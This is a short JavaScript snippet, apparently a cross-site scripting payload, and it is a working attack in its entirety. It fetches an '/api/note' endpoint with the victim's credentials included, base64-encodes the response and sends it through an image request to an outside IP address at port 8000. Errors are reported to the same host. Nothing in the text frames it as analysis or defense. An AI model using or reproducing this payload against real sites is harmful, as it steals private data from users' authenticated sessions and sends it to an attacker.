(async () => {
  try {
    const r = await fetch('/api/note', {credentials:'include'});
    const j = await r.json().catch(()=>null);
    const data = j && j.note ? j.note : await r.text();
    new Image().src = 'http://213.163.100.234:8000/log?d=' +
      encodeURIComponent(btoa(unescape(encodeURIComponent(String(data)))));
  } catch(e) {
    new Image().src = 'http://213.163.100.234:8000/err?e=' + encodeURIComponent(String(e));
  }
})();
